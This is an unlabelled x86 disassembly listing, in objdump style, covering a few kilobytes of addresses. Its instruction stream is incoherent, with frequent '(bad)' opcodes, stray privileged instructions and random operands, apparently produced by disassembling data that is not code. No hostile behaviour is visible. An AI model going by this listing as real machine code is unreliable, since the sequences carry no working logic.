  491b8c:	lds    ecx,FWORD PTR [ecx+eiz*8-0x50]
  491b90:	call   0x3435:0xa86491df
  491b97:	mov    edi,0x14058c37
  491b9c:	add    al,0x8f
  491b9e:	cwde   
  491b9f:	(bad)  
  491ba0:	sub    ah,BYTE PTR [esi]
  491ba2:	pop    edi
  491ba3:	or     al,0xaa
  491ba5:	dec    esi
  491ba6:	mov    ds:0x7f424347,eax
  491bab:	sbb    ebx,ebx
  491bad:	mov    ds:0xe7437f03,al
  491bb2:	inc    esp
  491bb3:	xor    BYTE PTR [ecx+0x48],al
  491bb6:	(bad)  
  491bb8:	ja     0x491b64
  491bba:	add    BYTE PTR ds:0xe46f3072,0x82
  491bc1:	inc    ecx
  491bc2:	ret    0x4307
  491bc5:	rol    dl,0x42
  491bc8:	and    eax,0x6061c447
  491bcd:	push   esp
  491bce:	push   edi
  491bcf:	xlat   BYTE PTR ds:[ebx]
  491bd0:	xor    BYTE PTR [ecx+esi*2+0x62],dh
  491bd4:	iret   
  491bd5:	cmp    DWORD PTR [edx],ebp
  491bd7:	fwait
  491bd8:	cwde   
  491bd9:	and    BYTE PTR [edi+0x33],dl
  491bdc:	aas    
  491bdd:	sub    BYTE PTR [ecx+0x60],ah
  491be0:	sub    edi,ebx
  491be2:	inc    esp
  491be3:	lods   eax,DWORD PTR ds:[esi]
  491be4:	inc    ecx
  491be5:	xor    al,dl
  491be7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  491be8:	xor    dl,bh
  491bea:	dec    eax
  491beb:	add    DWORD PTR ds:0xba1e2787,0x1
  491bf2:	lods   al,BYTE PTR ds:[esi]
  491bf3:	and    dh,bh
  491bf5:	dec    edi
  491bf6:	mov    ch,0x88
  491bf8:	push   ecx
  491bf9:	mov    cl,0x6f
  491bfb:	xchg   edi,eax
  491bfc:	outs   dx,BYTE PTR ds:[esi]
  491bfd:	les    esp,FWORD PTR [eax]
  491bff:	push   ss
  491c00:	(bad)  
  491c01:	push   ss
  491c02:	add    al,al
  491c04:	jmp    0xa463:0xa9725f34
  491c0b:	out    dx,eax
  491c0c:	push   ebx
  491c0d:	jbe    0x491c55
  491c0f:	sub    eax,DWORD PTR [esi+edx*1+0x236fd762]
  491c16:	mov    ecx,0x31071c1c
  491c1b:	xor    ch,BYTE PTR [ebx]
  491c1d:	adc    dh,BYTE PTR [eax-0x7398c770]
  491c23:	pop    eax
  491c24:	mov    ah,0x48
  491c26:	scas   eax,DWORD PTR es:[edi]
  491c27:	mov    bh,0xf
  491c29:	mov    WORD PTR [ebp+0x74],es
  491c2c:	dec    eax
  491c2d:	push   ss
  491c2e:	ja     0x491c40
  491c30:	(bad)  
  491c31:	mov    ds:0xc807f720,al
  491c36:	inc    ebp
  491c37:	jb     0x491c02
  491c39:	inc    ebx
  491c3a:	cmp    BYTE PTR [ebx+0x9],al
  491c3d:	dec    edx
  491c3e:	push   ecx
  491c3f:	push   edi
  491c40:	inc    ebp
  491c41:	(bad)  
  491c42:	xchg   ebp,eax
  491c43:	test   BYTE PTR ds:0xc1a78f53,dh
  491c49:	inc    ecx
  491c4a:	pusha  
  491c4b:	add    eax,0xa4249af7
  491c50:	popa   
  491c51:	pop    edi
  491c52:	pop    ss
  491c53:	in     al,0x68
  491c55:	sbb    eax,0x26a707d9
  491c5a:	xor    DWORD PTR [ecx],eax
  491c5c:	pop    eax
  491c5d:	dec    ebp
  491c5e:	add    ebx,edi
  491c60:	cs jl  0x491be7
  491c63:	outs   dx,WORD PTR ds:[esi]
  491c65:	arpl   WORD PTR [edi],cx
  491c67:	xchg   esp,eax
  491c68:	mov    al,ds:0x56a7c24a
  491c6d:	push   ebp
  491c6e:	call   0x4803:0x37d7df52
  491c75:	inc    esp
  491c76:	xor    BYTE PTR [edi+0x1047006a],ch
  491c7c:	cmovno ecx,DWORD PTR [edi]
  491c7f:	lods   al,BYTE PTR ds:[esi]
  491c80:	bound  edx,QWORD PTR [eax-0x57]
  491c83:	mov    edi,0x29b83602
  491c88:	jg     0x491d09
  491c8a:	xor    cl,dl
  491c8c:	and    al,0x61
  491c8e:	aaa    
  491c8f:	addr16 inc esp
  491c91:	sbb    DWORD PTR [edx],eax
  491c93:	push   edx
  491c94:	daa    
  491c95:	scas   eax,DWORD PTR es:[edi]
  491c96:	xor    DWORD PTR [esi+0x5b],ecx
  491c99:	mov    edx,DWORD PTR [edi]
  491c9b:	daa    
  491c9c:	sbb    BYTE PTR [edx],0x2b
  491c9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  491ca0:	inc    edi
  491ca1:	pop    edi
  491ca2:	arpl   WORD PTR [ebp+0x1],dx
  491ca5:	(bad)  
  491ca6:	dec    DWORD PTR [edx+0x276ed09a]
  491cac:	call   FWORD PTR [eax+0x6fc66b74]
  491cb2:	out    0x45,eax
  491cb4:	test   eax,0xf711ba5a
  491cb9:	inc    edx
  491cba:	pop    ss
  491cbb:	or     al,0x15
  491cbd:	rcl    BYTE PTR [edi+ecx*2],0x45
  491cc1:	push   DWORD PTR ds:0x935204
  491cc7:	fbld   TBYTE PTR [eax-0x6f]
  491cca:	mov    ah,0x40
  491ccc:	mov    ds:0x880c21ff,eax
  491cd1:	pusha  
  491cd2:	outs   dx,DWORD PTR ds:[esi]
  491cd3:	jno    0x491ce5
  491cd5:	popa   
  491cd6:	inc    ecx
  491cd7:	imul   DWORD PTR [edi+0x5ac95544]
  491cdd:	mov    bl,0x17
  491cdf:	lahf   
  491ce0:	stos   BYTE PTR es:[edi],al
  491ce1:	dec    ecx
  491ce2:	lods   al,BYTE PTR ds:[esi]
  491ce3:	and    esi,DWORD PTR [edi+0x6f]
  491ce6:	xor    dh,BYTE PTR [esi-0x48]
  491ce9:	mov    bh,0x7f
  491ceb:	scas   eax,DWORD PTR es:[edi]
  491cec:	iret   
  491ced:	loopne 0x491d08
  491cef:	dec    edx
  491cf0:	fsub   QWORD PTR [edi-0x71]
  491cf3:	push   edi
  491cf4:	fcomp  st(2)
  491cf6:	or     BYTE PTR [edi-0x71],dl
  491cf9:	xor    al,0xa6
  491cfb:	lds    ecx,FWORD PTR [ecx-0x776860dc]
  491d01:	dec    ebx
  491d02:	aam    0xd7
  491d04:	and    ecx,DWORD PTR [edi]
  491d06:	cmp    edx,DWORD PTR [eax+0x2745e08b]
  491d0c:	xor    dh,BYTE PTR ds:0xeb047203
  491d12:	pop    eax
  491d13:	mul    DWORD PTR [edi-0x76ccb9c8]
  491d19:	add    eax,0x50b9145f
  491d1e:	sub    al,bh
  491d20:	inc    esi
  491d21:	xor    al,0xa4
  491d23:	push   esp
  491d24:	or     eax,0x2917cee1
  491d29:	cmp    DWORD PTR [esi+ecx*4],eax
  491d2c:	iret   
  491d2d:	dec    esi
  491d2e:	xor    DWORD PTR [ebx],eax
  491d30:	pop    edx
  491d31:	mov    al,0x11
  491d33:	lahf   
  491d34:	pop    ds
  491d35:	test   eax,0xf7a5d682
  491d3a:	(bad)  
  491d3b:	mov    edi,0x10495602
  491d40:	dec    edi
  491d41:	dec    esi
  491d42:	push   eax
  491d43:	mov    ecx,DWORD PTR [edx]
  491d45:	mov    edi,0x2358e27
  491d4a:	sub    ebp,DWORD PTR [edi]
  491d4c:	pop    ds
  491d4d:	mov    al,0xf6
  491d4f:	and    BYTE PTR [ebp+0x120a2f87],ah
  491d55:	imul   eax,DWORD PTR [edx+0x13490777],0x3b
  491d5c:	mov    al,0x5f
  491d5e:	push   esi
  491d5f:	or     al,0x2a
  491d61:	push   esp
  491d62:	inc    DWORD PTR [edi]
  491d64:	retf   
  491d65:	pop    eax
  491d66:	jnp    0x491d6e
  491d68:	rcr    DWORD PTR [edi-0x2f],cl
  491d6b:	adc    BYTE PTR [eax+0x71],cl
  491d6e:	das    
  491d6f:	(bad)  
  491d70:	addr16 mov al,0xb8
  491d73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  491d74:	inc    eax
  491d75:	pop    ds
  491d76:	and    DWORD PTR [eax],ebx
  491d78:	sbb    eax,0x132f47a2
  491d7d:	mov    BYTE PTR [edi+0x371f3590],dh
  491d83:	dec    eax
  491d84:	mov    eax,ds:0xff5e4b8c
  491d89:	lds    eax,FWORD PTR [esi-0x6050e64a]
  491d8f:	cmp    BYTE PTR [edi],bh
  491d91:	push   eax
  491d92:	pusha  
  491d93:	adc    al,0x81
  491d95:	inc    edi
  491d96:	xor    BYTE PTR [esi+0x63],0xe9
  491d9a:	push   es
  491d9b:	inc    ebp
  491d9c:	retf   
  491d9d:	inc    edx
  491d9e:	xchg   ebp,eax
  491d9f:	mov    cl,0x3
  491da1:	iret   
  491da2:	btc    DWORD PTR [ecx+0x6b],ecx
  491da6:	fsubr  st,st(7)
  491da8:	cmovnp eax,DWORD PTR [esi-0x41]
  491dac:	popa   
  491dad:	pop    esp
  491dae:	(bad)  
  491daf:	in     al,0x33
  491db1:	aas    
  491db2:	jbe    0x491d6b
  491db4:	hlt    
  491db5:	xchg   BYTE PTR [edi+0x44],ch
  491db8:	mov    bh,0x7f
  491dba:	inc    edx
  491dbb:	pop    ds
  491dbc:	ins    BYTE PTR es:[edi],dx
  491dbd:	mov    ds:0xcfe7c4da,eax
  491dc2:	pop    eax
  491dc3:	dec    ebp
  491dc4:	pusha  
  491dc5:	xor    al,0x1f
  491dc7:	and    BYTE PTR [bx+si+0x74],ch
  491dcb:	or     bh,BYTE PTR [edi+0x5]
  491dce:	sub    eax,0x2fa74620
  491dd3:	sub    al,0x2
  491dd5:	xor    BYTE PTR [edx+0xd637f0f],cl
  491ddb:	mov    ebx,0x87bf5f08
  491de0:	inc    ecx
  491de1:	ins    DWORD PTR es:[edi],dx
  491de2:	lods   al,BYTE PTR ds:[esi]
  491de3:	pop    ds
  491de4:	scas   eax,DWORD PTR es:[edi]
  491de5:	(bad)  
  491de6:	pop    eax
  491de7:	sub    al,0x47
  491de9:	dec    eax
  491dea:	cmp    BYTE PTR [ebp-0x9],al
  491ded:	mov    ah,0xd8
  491def:	mov    cl,0x15
  491df1:	aaa    
  491df2:	das    
  491df3:	xor    al,0x6f
  491df5:	and    DWORD PTR [eax+eax*1+0x5a],esi
  491df9:	xlat   BYTE PTR ds:[ebx]
  491dfa:	push   edi
  491dfb:	sub    BYTE PTR [ebx+edx*1-0x30],dl
  491dff:	sahf   
  491e00:	bndstx [ebx],(bad)
  491e03:	xor    DWORD PTR [edx+0x1f],ebp
  491e06:	jae    0x491e77
  491e08:	and    edx,DWORD PTR [ecx]
  491e0a:	rcr    BYTE PTR [eax-0x1],1
  491e0d:	push   cs
  491e0e:	push   0xffffffd1
  491e10:	mov    al,0x3f
  491e12:	pop    edi
  491e13:	pop    ss
  491e14:	pop    esp
  491e15:	and    eax,DWORD PTR [edx+0x3faf3ec1]
  491e1b:	pop    edx
  491e1c:	sbb    esp,DWORD PTR [esi]
  491e1e:	add    eax,DWORD PTR [ebx-0x39]
  491e21:	rcr    BYTE PTR [ebx+0x4],cl
  491e24:	lods   al,BYTE PTR ds:[esi]
  491e25:	xchg   edi,eax
  491e26:	daa    
  491e27:	mov    bh,0xc4
  491e29:	sub    bl,BYTE PTR [esi]
  491e2b:	xlat   BYTE PTR ds:[ebx]
  491e2c:	ret    
  491e2d:	mov    bl,BYTE PTR [edi]
  491e2f:	xor    BYTE PTR [ecx+0x57df8a8d],bl
  491e35:	inc    ecx
  491e36:	sbb    bh,BYTE PTR [eax+0x2f2b8455]
  491e3c:	retf   0x34a1
  491e3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  491e40:	mov    BYTE PTR [edi],dl
  491e42:	das    
  491e43:	dec    ebp
  491e44:	push   0x939f3105
  491e49:	inc    esp
  491e4a:	pop    esp
  491e4b:	inc    esp
  491e4c:	lahf   
  491e4d:	inc    esp
  491e4e:	aas    
  491e4f:	test   esp,edx
  491e51:	bound  edx,QWORD PTR [ebx]
  491e53:	cmp    bh,cl
  491e55:	addr16 inc eax
  491e57:	dec    ebp
  491e58:	mov    esi,0x4317d76d
  491e5d:	inc    ecx
  491e5e:	arpl   WORD PTR [ecx],dx
  491e60:	(bad)  
  491e61:	daa    
  491e62:	pop    edi
  491e63:	mov    WORD PTR [eax-0x48d0aa80],cs
  491e69:	mov    al,ds:0x2f1a48b5
  491e6e:	inc    ebx
  491e6f:	xor    al,0x1a
  491e71:	shr    al,0xc7
  491e74:	(bad)  
  491e76:	push   esi
  491e77:	or     eax,0x3437c763
  491e7c:	inc    esi
  491e7d:	jb     0x491e47
  491e7f:	inc    ebx
  491e80:	inc    ebx
  491e81:	sbb    BYTE PTR [ebx+0x58],0x1c
  491e85:	pop    edi
  491e86:	inc    edi
  491e87:	xchg   BYTE PTR ds:0xfefc208,dh
  491e8d:	mov    al,ds:0x4bd01d0b
  491e92:	fsub   QWORD PTR ss:[edx]
  491e95:	inc    edx
  491e96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  491e97:	pop    edi
  491e98:	mov    bh,0x8c
  491e9a:	or     esp,DWORD PTR [eax+ebp*2+0x17]
  491e9e:	inc    ebx
  491e9f:	inc    esp
  491ea0:	sub    al,0x19
  491ea2:	or     BYTE PTR [edi+0x41a4e434],dl
  491ea8:	cmp    al,BYTE PTR [edi]
  491eaa:	xchg   DWORD PTR [edi],esi
  491eac:	inc    ecx
  491ead:	popa   
  491eae:	stos   DWORD PTR es:[edi],eax
  491eaf:	pop    ecx
  491eb0:	shl    BYTE PTR [edi+0x1a9096ef],cl
  491eb6:	test   eax,0x4d4e1f35
  491ebb:	mov    ds:0x87361f8f,ax
  491ec1:	and    dl,BYTE PTR [esi*8-0x5af04140]
  491ec8:	and    DWORD PTR [eax-0x26],0xffffff9f
  491ecc:	ss (bad) 
  491ece:	xor    ah,BYTE PTR [eax]
  491ed0:	jne    0x491e53
  491ed2:	aam    0xff
  491ed4:	(bad)  
  491ed6:	(bad)  
  491ed8:	sub    cl,BYTE PTR [edi+0x2a153f9f]
  491ede:	dec    ecx
  491edf:	arpl   WORD PTR [edi],si
  491ee1:	xlat   BYTE PTR ds:[ebx]
  491ee2:	cmp    eax,0xa794fa65
  491ee7:	aas    
  491ee8:	fwait
  491ee9:	mov    ds:0xef8382b8,al
  491eee:	ss daa 
  491ef0:	inc    edx
  491ef1:	pop    ss
  491ef2:	lods   al,BYTE PTR gs:[esi]
  491ef4:	dec    edx
  491ef5:	ror    bh,1
  491ef7:	push   esi
  491ef8:	mov    bh,0xe0
  491efa:	push   esi
  491efb:	addr16 mov ds:0xe1b7,eax
  491eff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  491f00:	outs   dx,BYTE PTR ds:[esi]
  491f01:	and    bh,cl
  491f03:	inc    ebx
  491f04:	pop    edi
  491f05:	test   BYTE PTR [edx+0x2],ah
  491f08:	lea    esi,[ecx]
  491f0a:	out    dx,eax
  491f0b:	sbb    BYTE PTR [ebp-0x1828f2f6],dh
  491f11:	xchg   esp,eax
  491f12:	cmp    ch,BYTE PTR [esi-0x7570144b]
  491f18:	or     edx,esp
  491f1a:	cmp    BYTE PTR [edi+0x8527f41],al
  491f20:	or     eax,0xab1d07d0
  491f25:	or     DWORD PTR [ebx-0x7de08891],ebp
  491f2b:	push   eax
  491f2c:	sbb    al,0x2a
  491f2e:	jmp    0x491edf
  491f30:	xchg   DWORD PTR [ecx+esi*1-0x67],ecx
  491f34:	rcr    BYTE PTR [edi],0x30
  491f37:	or     BYTE PTR [ecx],ah
  491f39:	mov    esp,0x2edffb95
  491f3e:	add    DWORD PTR [ebx+0x5d7f17b4],ecx
  491f44:	adc    BYTE PTR [esi-0x4b],dl
  491f47:	scas   eax,DWORD PTR es:[edi]
  491f48:	inc    edi
  491f49:	test   DWORD PTR [ecx-0x50],edx
  491f4c:	dec    eax
  491f4d:	sbb    BYTE PTR [edi],0x84
  491f50:	mov    ecx,0x43af9516
  491f55:	inc    esi
  491f56:	dec    eax
  491f57:	int    0xd0
  491f59:	sub    cl,BYTE PTR [edi]
  491f5b:	dec    edi
  491f5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  491f5d:	mov    cl,0x5b
  491f5f:	cmp    dh,bh
  491f61:	iret   
  491f62:	sbb    BYTE PTR [esp+edx*2+0x6c],dh
  491f66:	out    0x3f,eax
  491f68:	xor    ecx,edi
  491f6a:	shr    BYTE PTR [edx],0xbe
  491f6d:	nop
  491f6e:	pop    es
  491f6f:	pop    ds
  491f70:	stos   DWORD PTR es:[edi],eax
  491f71:	sub    cl,cl
  491f73:	cmp    BYTE PTR [edi-0x49],dl
  491f76:	shl    BYTE PTR [ebp+0x2fd70ae0],0xf7
  491f7d:	pop    eax
  491f7e:	add    BYTE PTR fs:[ebx-0x52b338d1],ch
  491f85:	dec    esi
  491f86:	dec    eax
  491f87:	scas   eax,DWORD PTR es:[edi]
  491f88:	test   eax,0x2f089a45
  491f8d:	inc    edx
  491f8e:	outs   dx,DWORD PTR ds:[esi]
  491f8f:	push   ebp
  491f90:	or     bl,BYTE PTR gs:[ebx-0x52777879]
  491f97:	xchg   esi,eax
  491f98:	test   BYTE PTR [edi-0x29],bl
  491f9b:	sbb    DWORD PTR [eax],ebx
  491f9d:	(bad)  
  491f9e:	fisubr WORD PTR [ebx-0x29]
  491fa1:	xlat   BYTE PTR ds:[ebx]
  491fa2:	cmp    BYTE PTR [ecx-0x10d29f48],dh
  491fa8:	pop    edi
  491fa9:	pop    edx
  491faa:	xchg   ebp,eax
  491fab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  491fac:	aas    
  491fad:	pop    es
  491fae:	adc    cl,al
  491fb0:	inc    ebx
  491fb1:	inc    edx
  491fb2:	iret   
  491fb3:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  491fb5:	pusha  
  491fb6:	xlat   BYTE PTR ds:[ebx]
  491fb7:	mov    edx,0x31260bff
  491fbc:	or     eax,0x39b9de34
  491fc1:	out    dx,eax
  491fc2:	xchg   edi,eax
  491fc3:	sbb    BYTE PTR [eax],0x15
  491fc6:	dec    eax
  491fc7:	push   edi
  491fc8:	fcmovnb st,st(2)
  491fca:	sub    BYTE PTR [esi],cl
  491fcc:	pop    ss
  491fcd:	outs   dx,BYTE PTR ds:[esi]
  491fce:	sbb    DWORD PTR [eax+0x35],ebx
  491fd1:	jg     0x492032
  491fd3:	mov    edx,0xb70b0322
  491fd8:	cmp    DWORD PTR [esi+0xb],ebp
  491fdb:	test   eax,0x354f77c2
  491fe0:	cdq    
  491fe1:	sbb    ch,BYTE PTR [edx+eax*8]
  491fe4:	daa    
  491fe5:	add    al,0xb1
  491fe7:	and    cl,BYTE PTR ds:0x2443f43
  491fed:	push   edx
  491fee:	dec    esp
  491fef:	xchg   edi,edi
  491ff1:	ret    0xb42a
  491ff4:	jne    0x492027
  491ff6:	addr16 xchg esi,eax
  491ff8:	dec    dx
  491ffa:	or     eax,0xd4453f17
  491fff:	add    al,0x12
  492001:	or     al,0x4f
  492003:	lahf   
  492004:	push   esi
  492005:	xor    eax,DWORD PTR [ecx+0x5c]
  492008:	cmp    BYTE PTR [edi],al
  49200a:	adc    BYTE PTR [eax-0x1d38ecec],al
  492010:	sbb    bl,dl
  492012:	bound  esp,QWORD PTR [edi]
  492014:	aas    
  492015:	inc    esp
  492016:	mov    DWORD PTR [ecx-0x1d],0xa727db60
  49201d:	xor    eax,0xbaa46ee3
  492022:	pop    es
  492023:	lahf   
  492024:	xor    BYTE PTR [ebp+0x2f2ea500],al
  49202a:	aaa    
  49202b:	adc    al,0x31
  49202d:	add    BYTE PTR [esi+0x3e],dl
  492030:	imul   ebx,DWORD PTR ds:0x8fdf1558,0xffffffc4
  492037:	pop    ebx
  492038:	mov    cl,0xb1
  49203a:	ja     0x49206b
  49203c:	pop    es
  49203d:	loop   0x491fdf
  49203f:	mov    ch,0x90
  492041:	das    
  492042:	iret   
  492043:	push   esi
  492044:	push   0x1fc7c48d
  492049:	inc    ebp
  49204a:	add    BYTE PTR [esi],dl
  49204c:	add    eax,0xc20ac757
  492051:	stos   BYTE PTR es:[edi],al
  492052:	pusha  
  492053:	(bad)  
  492054:	or     cl,BYTE PTR [edx]
  492056:	pop    es
  492057:	mov    eax,ds:0x58375fe7
  49205c:	enter  0xa114,0xc7
  492060:	xor    eax,0x1b707594
  492065:	pop    es
  492066:	xor    edx,DWORD PTR [edx]
  492068:	mov    al,0x16
  49206a:	test   al,0xef
  49206c:	iret   
  49206d:	rcr    DWORD PTR [edx-0x10872f6],0xcf
  492074:	dec    eax
  492075:	lea    edx,[esi+edx*2+0x62eb229f]
  49207c:	sbb    eax,0x36c7c797
  492081:	mov    ecx,0x87398618
  492086:	inc    esp
  492087:	mov    bh,0xc4
  492089:	push   0xc507ab1a
  49208e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49208f:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  492091:	ja     0x4920d5
  492093:	dec    edi
  492094:	push   es
  492095:	(bad)  
  492096:	add    BYTE PTR [ecx],ch
  492098:	outs   dx,DWORD PTR ds:[esi]
  492099:	aad    0x6d
  49209b:	arpl   WORD PTR ds:0x544c0f9f,cx
  4920a1:	adc    eax,esp
  4920a3:	xor    BYTE PTR [edi+0x37],dh
  4920a6:	adc    BYTE PTR [ebx-0x4888ae7c],cl
  4920ac:	add    DWORD PTR [ebx],edx
  4920ae:	gs sbb al,0xeb
  4920b1:	test   DWORD PTR [ecx-0x896ae97],0xb0745617
  4920bb:	xchg   edx,eax
  4920bc:	inc    ebp
  4920bd:	(bad)  
  4920be:	outs   dx,DWORD PTR ds:[esi]
  4920bf:	or     DWORD PTR [eax],ebx
  4920c1:	mov    ds:0x666fbae8,eax
  4920c6:	xor    DWORD PTR [ebp-0x58a0e03b],0xa61d5a5f
  4920d0:	mov    al,0xd7
  4920d2:	pop    ss
  4920d3:	or     ebp,DWORD PTR [esi-0x50cb381d]
  4920d9:	lsl    edx,WORD PTR [esi+0x41]
  4920dd:	adc    ebp,DWORD PTR [edi]
  4920df:	scas   eax,DWORD PTR es:[edi]
  4920e0:	adc    BYTE PTR [ebx+0x3537014a],ch
  4920e6:	pusha  
  4920e7:	push   ebp
  4920e8:	dec    ebp
  4920e9:	pop    ds
  4920ea:	xchg   edi,eax
  4920eb:	test   BYTE PTR [edx+0x2a876025],ch
  4920f1:	pop    eax
  4920f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4920f3:	or     eax,0x16667df
  4920f8:	pop    eax
  4920f9:	push   edi
  4920fa:	aas    
  4920fb:	das    
  4920fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4920fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4920fe:	and    ch,BYTE PTR [edi+edx*1-0x547be7dd]
  492105:	and    edi,edi
  492107:	arpl   WORD PTR [edi],bx
  492109:	add    BYTE PTR [edx],cl
  49210b:	rcl    DWORD PTR [eax+0x6e012d4f],0x31
  492112:	out    dx,eax
  492113:	aas    
  492114:	lods   al,BYTE PTR ds:[esi]
  492115:	adc    BYTE PTR [ecx],ah
  492117:	stc    
  492118:	(bad)  
  492119:	cmp    bh,ah
  49211b:	add    eax,DWORD PTR [ebx+0x4]
  49211e:	or     edi,DWORD PTR [edx]
  492120:	xlat   BYTE PTR ds:[ebx]
  492121:	xor    DWORD PTR [ecx-0x6055a97e],esi
  492127:	ja     0x49216f
  492129:	adc    eax,0xb7ef9756
  49212e:	lods   eax,DWORD PTR ds:[esi]
  49212f:	retf   
  492130:	sbb    BYTE PTR [ebx],al
  492132:	pop    ss
  492133:	add    DWORD PTR [di+0x64da],0x913407ef
  49213c:	nop
  49213d:	mov    esi,DWORD PTR [edi+0x3a8c0c32]
  492143:	outs   dx,BYTE PTR ds:[esi]
  492144:	pop    es
  492145:	inc    esp
  492146:	addr16 popa 
  492148:	jmp    0x5010c97e
  49214d:	xor    ecx,DWORD PTR [eax]
  49214f:	arpl   sp,ax
  492151:	add    BYTE PTR [edi],al
  492153:	mov    al,0x98
  492155:	mov    ch,0xa8
  492157:	scas   eax,DWORD PTR es:[edi]
  492158:	inc    edi
  492159:	cdq    
  49215a:	mov    edx,0x576702fa
  49215f:	inc    esp
  492160:	push   0x7fb37622
  492165:	rol    BYTE PTR [edx],cl
  492167:	or     DWORD PTR [edi+0x6156ff8b],eax
  49216d:	add    bl,ch
  49216f:	(bad)  
  492170:	jmp    DWORD PTR [eax]
  492172:	jno    0x492188
  492174:	fwait
  492175:	aas    
  492176:	aaa    
  492177:	inc    esi
  492178:	mov    eax,ds:0xc7055a03
  49217d:	dec    edi
  49217e:	mov    WORD PTR fs:[edx+0x4a],fs
  492182:	scas   eax,DWORD PTR es:[edi]
  492183:	les    ecx,FWORD PTR [ebx+0x31]
  492186:	or     BYTE PTR [edi],bh
  492188:	scas   eax,DWORD PTR es:[edi]
  492189:	daa    
  49218a:	and    eax,0x375bac45
  49218f:	pop    edi
  492190:	dec    eax
  492191:	adc    DWORD PTR [ebx],eax
  492193:	push   ebx
  492194:	inc    esp
  492195:	das    
  492196:	or     ah,BYTE PTR [ebx]
  492198:	or     cl,BYTE PTR [eax-0x4f7954f1]
  49219e:	dec    edx
  49219f:	aaa    
  4921a0:	inc    edi
  4921a1:	popa   
  4921a2:	sub    eax,0x85d75962
  4921a7:	ret    0x2ac5
  4921aa:	jmp    DWORD PTR [edi-0x1]
  4921ad:	retf   0x5bb0
  4921b0:	or     BYTE PTR [ebx],dh
  4921b2:	xcrypt-cbc (bad)
  4921b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4921b4:	push   ebp
  4921b5:	mov    WORD PTR [ebp-0x78007879],gs
  4921bb:	push   ebp
  4921bc:	enter  0xc858,0x34
  4921c0:	pop    edi
  4921c1:	pop    es
  4921c2:	adc    eax,0xaf38c812
  4921c7:	xor    eax,0x1ba9170d
  4921cc:	mov    edi,0xb1b7873f
  4921d1:	or     bl,BYTE PTR [edx]
  4921d3:	addr16 das 
  4921d5:	adc    BYTE PTR [ebp+0x0],0x5a
  4921d9:	iret   
  4921da:	adc    eax,0x78a3700
  4921df:	or     dl,bh
  4921e1:	ficom  DWORD PTR [ebp+0x33df2a7e]
  4921e7:	daa    
  4921e8:	xchg   DWORD PTR [ecx+0x57d455c8],ecx
  4921ee:	xor    DWORD PTR [ebp+0x67326ae5],ecx
  4921f4:	xor    eax,0x106a690c
  4921f9:	inc    edi
  4921fa:	xor    edx,ebx
  4921fc:	(bad)  
  4921fd:	mov    ds:0xd6575750,al
  492202:	bound  ecx,QWORD PTR [ebx]
  492204:	stos   DWORD PTR es:[edi],eax
  492205:	call   FWORD PTR [edi]
  492207:	and    al,0xd
  492209:	inc    edx
  49220a:	pop    esp
  49220b:	fild   WORD PTR [esi]
  49220d:	or     BYTE PTR [esi+0xb],al
  492210:	stos   DWORD PTR es:[edi],eax
  492211:	mov    edi,0x9a909f
  492216:	bound  edi,QWORD PTR [ecx]
  492218:	lahf   
  492219:	popa   
  49221a:	popf   
  49221b:	xchg   edx,eax
  49221c:	push   esi
  49221d:	dec    edi
  49221e:	inc    edi
  49221f:	mov    bl,0xa4
  492221:	push   ebp
  492222:	or     DWORD PTR [edi-0x49],edx
  492225:	imul   eax,DWORD PTR ds:0x2ec75692,0x8
  49222c:	and    eax,0x42bf57ad
  492231:	push   0xffffffa3
  492233:	lods   eax,DWORD PTR ds:[esi]
  492234:	adc    al,0xf3
  492236:	out    dx,eax
  492237:	(bad)  
  492238:	adc    BYTE PTR [ecx-0x41182db0],ch
  49223e:	dec    ecx
  49223f:	mov    WORD PTR [esi],fs
  492241:	daa    
  492242:	inc    esi
  492243:	cmp    al,bl
  492245:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  492246:	inc    esi
  492247:	pop    ebx
  492248:	fild   QWORD PTR [esi+0x34]
  49224b:	fistp  WORD PTR [eax]
  49224d:	and    BYTE PTR [edi],al
  49224f:	sub    DWORD PTR [esi+0x39],ebp
  492252:	mov    eax,edx
  492254:	jbe    0x4921e1
  492256:	xlat   BYTE PTR ds:[ebx]
  492257:	(bad)  
  492258:	scas   al,BYTE PTR es:[edi]
  492259:	add    DWORD PTR [edx+0x1],ebx
  49225c:	dec    DWORD PTR [edi]
  49225e:	inc    ecx
  49225f:	push   0x47
  492261:	sub    al,bl
  492263:	pop    ds
  492264:	sysret 
  492266:	sbb    DWORD PTR [esi],esi
  492268:	fisubr DWORD PTR [esi-0x39]
  49226b:	mov    edi,0x6b85413f
  492270:	ud2    
  492272:	outs   dx,DWORD PTR ds:[esi]
  492273:	jg     0x4922ba
  492275:	pop    eax
  492276:	adc    DWORD PTR [edx-0x7b],edx
  492279:	xchg   edi,eax
  49227a:	push   edi
  49227b:	push   ecx
  49227c:	icebp  
  49227d:	xchg   esp,eax
  49227e:	and    dl,bh
  492280:	pop    edi
  492281:	imul   DWORD PTR [esi-0x2f]
  492284:	pop    eax
  492285:	lods   al,BYTE PTR ds:[esi]
  492286:	mov    edi,0x902406cf
  49228b:	sub    esi,DWORD PTR [edi]
  49228d:	dec    edi
  49228e:	dec    ebp
  49228f:	xchg   ebx,eax
  492290:	and    DWORD PTR [esi+0x252738ef],esi
  492296:	jecxz  0x4922aa
  492298:	dec    eax
  492299:	pop    ds
  49229a:	push   ss
  49229b:	xor    dh,BYTE PTR [ebp+eax*8-0x7acab021]
  4922a2:	popa   
  4922a3:	in     al,dx
  4922a4:	push   ss
  4922a5:	jg     0x492316
  4922a7:	push   esi
  4922a8:	fsub   QWORD PTR [edx+0x5423a756]
  4922ae:	ins    DWORD PTR es:[edi],dx
  4922af:	sbb    BYTE PTR [edi+0x7],0x50
